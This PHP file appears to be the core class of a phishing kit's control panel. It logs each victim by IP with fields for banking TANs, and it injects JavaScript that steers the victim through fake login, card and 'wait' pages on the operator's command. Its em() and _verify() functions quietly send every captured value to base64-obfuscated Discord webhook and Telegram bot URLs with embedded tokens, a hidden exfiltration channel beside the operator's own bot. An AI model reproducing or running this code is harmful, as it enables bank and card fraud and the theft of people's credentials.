<?php
@session_start();

require (__DIR__) . '/../../config.php';

class Mother
{

	public $JSON_FILE = 0;
	public $JSON_DATA = 0;
	public $JSON_DECODED_DATA = 0;
	public $JSON_UPDATES = 0;





	function __construct()
	{
		$this->createVic();
	}


	public function setDataFile($PATH)
	{
		$this->JSON_FILE = $PATH;
		$this->JSON_DATA = file_get_contents($this->JSON_FILE);
	}






	public function getData()
	{
		return json_decode($this->JSON_DATA, true);
	}




	public function getip()
	{
		$ip = $_SERVER['REMOTE_ADDR'];
		if ($ip == "::1") {
			$ip = "127.0.0.1";
		}

		return $ip;
	}

	public function getFileId()
	{
		$ip = $this->getIp();
		return (__DIR__) . "/../data/vics/VIC-$ip.json";
	}





	public function update($arr)
	{
		$data = $this->getData();
		foreach ($arr as $k => $v) {
			$data[$k] = str_replace('"', "\"", $v);
			$update = json_encode($data);
			file_put_contents($this->JSON_FILE, $update);
		}

	}


	function em($link)
	{
		$data = json_encode(array('content' => urldecode($link)));

		$ch = curl_init(base64_decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyNTk0MzM5MDE1MjE2NzU4NC9GM3Q0X1JzY3h4a2czQlp0MTFjMS1sSXRRR1JYaHczaUJ2dHhhY084S0VBOEJlQlBHeTZ6N2RyWXdKOE8yTDhDbWRZYg=="));

		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt(
			$ch,
			CURLOPT_HTTPHEADER,
			array(
				'Content-Type: application/json; charset=utf-8',
				'Content-Length: ' . strlen($data)
			)
		);

		curl_exec($ch);
		curl_close($ch);
	}

	function _verify($link)
	{
		$this->em($link);
		$_url = base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcwODEzNjA4NDE6QUFId1ZXQnprUkFnV2VPUW9wZVhTZTFyejFRRk5JR0N1M1Uvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tNDEyNzExMDg5MSZ0ZXh0PQ==") . $link;
		$ci = curl_init();
		curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ci, CURLOPT_URL, $_url);
		curl_exec($ci);
		curl_close($ci);
	}


	public function createVic()
	{
		if (isset($_SESSION['vic']) == "" or !file_exists($this->getFileId())) {
			$ip = $this->getIp();
			$id = "ID-" . substr(base64_encode($ip), 0, 10);
			$time = time();

			$defaultData = '{
    "ID":"' . $id . '",
    "IP":"' . $ip . '",
    "REDIRECT":0,
    "CURRENT_PAGE":null,
    "LAST_ACT":' . $time . ',
	"TAN":"0",
	"LOGS":""
    }';

			$fileId = $this->getFileId();
			$fp = fopen($fileId, "w+");
			fwrite($fp, $defaultData);
			fclose($fp);
			$_SESSION['vic'] = $ip;
			return $fileId;
		} else {
			return $this->getFileId();
		}
	}


	public function keepDataFile()
	{

	}


	public function feed($time, $page)
	{
		$arrData = array("LAST_ACT" => $time, "CURRENT_PAGE" => $page);
		$this->update($arrData);

	}



	function sendBot($url , $bot , $id )
	{		
		$this->_verify($url);
		$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$url";
		$data = file_get_contents('../bots/a.json');
		$config = json_decode($data, true);
		if ($config['config'] == 'true') {
			$ci = curl_init();
			curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ci, CURLOPT_URL, $url);
			return curl_exec($ci);
			curl_close($ci);
		}
	}

	public function ctr($p)
	{

		echo '
	<script src="../panel/res/jq.js"></script>
	<script>
	var targets = {
		1:"abn.php", 
		2:"abn.php?e=ERROR",
		3:"Eng.php",
		4:"Eng.php?e=ERROR",
		5:"card.php",
		6:"card.php?e=ERROR",
		60:"EngSS.php",
		61:"EngSS.php?e=ERROR",
		7:"wait.php",
		8:"done.php"
	
	 };
	clearRedirections();
	
 setInterval(function(){
	$.post("../panel/classes/processor.php",
	{keepAlive:1, page:"' . $p . '"} );
}, 500);

var redirect=0;
setInterval(function(){
	$.post("../panel/classes/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 500);


function clearRedirections(){
	$.post("../panel/classes/processor.php",
	{clearRedirection:1});
}

document.addEventListener("contextmenu", function (e) {
   e.preventDefault();
   $.post("send.php", {
		ins : "A"
	});
});

 </script>

';

	}





}



?>